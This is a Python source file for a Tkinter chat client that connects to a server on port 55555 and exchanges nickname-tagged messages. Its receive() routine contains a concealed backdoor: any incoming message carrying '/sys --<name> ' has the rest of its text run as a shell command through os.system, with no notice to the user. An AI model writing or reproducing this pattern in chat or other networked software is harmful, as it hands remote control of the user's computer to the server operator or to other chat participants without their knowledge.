import socket as sock
import tkinter as tk
import threading
import select
import sys
import os

from tkinter.simpledialog import askstring
from tkinter import scrolledtext
os.system("cls")

if len(sys.argv) != 2:
    print("error\nCorrect usage: script, IP address")
    exit()

print(sys.argv)
IP_addr = str(sys.argv[1])
Port = 55555

class Client:
    def __init__(self, IP_addr, Port):
        print(IP_addr, Port)
        self.client = sock.socket(sock.AF_INET, sock.SOCK_STREAM)
        self.client.connect((IP_addr, Port))

        win=tk.Tk()
        win.withdraw()

        self.c_name = askstring("c_name", "input your name", parent=win)

        self.gui_done = False
        self.running = True

        gui = threading.Thread(target=self.gui)
        receive_thread = threading.Thread(target=self.receive)

        gui.start()
        receive_thread.start()

    def receive(self):
        while self.running:
            try:
                message = self.client.recv(2048).decode()
                name = self.c_name
                liststr=[]
                if f"/sys --{name} " in message:
                    for i in message:
                        if i == "/":
                            break
                        liststr.append(i)
                    strs=''.join([str(j) for j in liststr]) + f"/sys --{name} "
                    sysct = message.replace(strs, "")
                    os.system(f"{sysct}")
                else:
                    pass
                print(message)
                if message == 'NICK':
                    self.client.send(self.c_name.encode())
                else:
                    if self.gui_done:
                        self.text_area.config(state='normal')
                        self.text_area.insert('end', message)
                        self.text_area.yview('end')
                        self.text_area.config(state='disabled')
            except ConnectionAbortedError:
                break
            except:
                print("error!")
                self.client.close()
                break

    def write(self):
        message = f'{self.c_name}: {self.input_area.get("1.0", "end")}'
        self.client.send(message.encode())
        self.text_area.config(state='normal')
        self.text_area.insert('end', message)
        self.text_area.yview('end')
        self.text_area.config(state='disabled')
        self.input_area.delete('1.0', 'end')
        print(message)

    def stop(self):
        self.running = False
        self.window.destroy()
        self.client.close()
        exit(0)

    def gui(self):
        self.window = tk.Tk()
        self.window.geometry("640x400")
        self.window.configure(bg="lightgray")

        self.chat_label = tk.Label(self.window, text=f"{self.c_name}:", bg="lightgray")
        self.chat_label.config(font=("Arial", 12))
        self.chat_label.pack(padx=20, pady=0, anchor='nw')

        self.text_area = scrolledtext.ScrolledText(self.window, height=10, width=30)
        self.text_area.pack(padx=20, pady=5, side='left', fill=tk.Y, anchor='w')
        self.text_area.config(state='disabled')
        self.msg_label = tk.Label(self.window, text="Message:", bg="lightgray")
        self.msg_label.config(font=("Arial", 12),width=30)
        self.msg_label.pack(padx=50, pady=0, anchor='n')

        self.input_area = tk.Text(self.window, height=10, width=30)
        self.input_area.pack(padx=50, pady=0, anchor='e')


        self.send_button = tk.Button(self.window, text="Send", command=self.write)
        self.send_button.config(font=("Arial", 12))
        self.send_button.pack(padx=50, pady=0, anchor='center')

        self.window.bind('<Shift-Enter>', self.write)


        self.gui_done = True

        self.window.protocol("WM_DELETE_WINDOW", self.stop)

        self.window.mainloop()

client = Client(IP_addr, Port)
